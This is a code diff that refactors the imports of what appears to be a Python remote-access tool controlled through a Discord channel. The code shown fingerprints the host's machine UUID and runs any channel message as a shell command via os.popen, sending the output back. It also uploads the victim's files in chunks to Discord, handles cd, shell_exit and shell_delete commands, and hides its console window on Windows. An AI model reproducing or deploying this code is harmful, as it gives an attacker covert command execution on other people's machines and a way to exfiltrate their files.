@@ -1,12 +1,12 @@
 import config
 import discord
 from discord.ext import commands
-from io import BytesIO
+import io
 from mega import Mega
-from os import chdir, path, popen, system
-from platform import system
-from subprocess import check_output
-from sys import exit
+import os
+import platform
+import subprocess
+import sys
 
 
 TEXT_SIZE_MAX = 1992
@@ -104,27 +104,27 @@ async def machine_info():
     # Fix possible unbound
     machine_UUID = ""
 
-    if system() == "Windows":
-        get_UUID = str(check_output(
+    if platform.system() == "Windows":
+        get_UUID = str(subprocess.check_output(
             "wmic csproduct get UUID").decode().strip())
 
         for line in get_UUID:
             UUID = " ".join(get_UUID.split())
             machine_UUID = UUID[5:]
     
-    elif system() == "Linux":
-        machine_UUID = str(check_output(
+    elif platform.system() == "Linux":
+        machine_UUID = str(subprocess.check_output(
             ["cat", "/etc/machine-id"]).decode().strip())
 
-    elif system() == "Darwin":
-        machine_UUID = str(check_output(["ioreg",
-                                         "-d2",
-                                         "-c",
-                                         "IOPlatformExpertDevice",
-                                         "|",
-                                         "awk",
-                                         "-F",
-                                         "'/IOPlatformUUID/{print $(NF-1)}'"]))
+    elif platform.system() == "Darwin":
+        machine_UUID = str(subprocess.check_output(["ioreg",
+                                                    "-d2",
+                                                    "-c",
+                                                    "IOPlatformExpertDevice",
+                                                    "|",
+                                                    "awk",
+                                                    "-F",
+                                                    "'/IOPlatformUUID/{print $(NF-1)}'"]))
 
     else:
         machine_UUID = str("Unknown")
@@ -169,7 +169,7 @@ async def upload_chunks(filename):
 
             await channel.send(f"Uploading part {i} of the file as "
                                f"{uploadname}, standby...")
-            await channel.send(file=discord.File(BytesIO(chunk),
+            await channel.send(file=discord.File(io.BytesIO(chunk),
                                                  filename=uploadname))
 
             chunk = file.read(FILE_SIZE_MAX)
@@ -181,7 +181,7 @@ async def upload(filename):
     filesize = 0
 
     try:
-        filesize = path.getsize(filename)
+        filesize = os.path.getsize(filename)
 
     except FileNotFoundError:
         await channel.send("File not found")
@@ -220,7 +220,7 @@ async def upload_chunks_from_memory(data):
 
         await channel.send(f"Uploading part {i} of the output as "
                            f"{uploadname}, standby")
-        await channel.send(file=discord.File(BytesIO(chunk),
+        await channel.send(file=discord.File(io.BytesIO(chunk),
                                              filename=uploadname))
 
 async def upload_from_memory(data, n):
@@ -229,7 +229,7 @@ async def upload_from_memory(data, n):
         filename = "output.txt"
         await channel.send("Output is too large. As a result, "
                            f"your output will be sent as {filename}")
-        await channel.send(file=discord.File(BytesIO(data),
+        await channel.send(file=discord.File(io.BytesIO(data),
                                              filename=filename))
     
     elif n <= CHUNKED_FILE_SIZE_MAX:
@@ -240,7 +240,7 @@ async def handle_user_input(content):
     user_input = ""
 
     try:
-        user_input = popen(content).read()
+        user_input = os.popen(content).read()
     
     except:
         await channel.send("Error reading command output.")
@@ -296,7 +296,7 @@ async def shell_input(message):
 
     elif message.content.startswith("cd"):
         # Change directories
-        chdir(message.content.split(" ")[1])
+        os.chdir(message.content.split(" ")[1])
 
         # Notify the user of the directory change
         await channel.send("`cd` complete")
@@ -304,7 +304,7 @@ async def shell_input(message):
     # Check if the message content starts with "shell_exit"
     elif message.content.startswith("shell_exit"):
         # Close the shell
-        exit(0)
+        sys.exit(0)
 
     # Check if the message content starts with "shell_delete"
     elif message.content.startswith("shell_delete"):
@@ -312,7 +312,7 @@ async def shell_input(message):
         await channel.delete()
 
         # Close the shell
-        exit(0)
+        sys.exit(0)
 
     else:
         await handle_user_input(message.content)
@@ -329,7 +329,7 @@ if system() == "Windows":
         ctypes.windll.user32.ShowWindow(hwnd, 0)
         ctypes.windll.kernel32.CloseHandle(hwnd)
         _, pid = win32process.GetWindowThreadProcessId(hwnd)
-        system(f"taskkill /PID {pid} /f")
+        os.system(f"taskkill /PID {pid} /f")
 
 # Server ID
 server_id = config.server_id
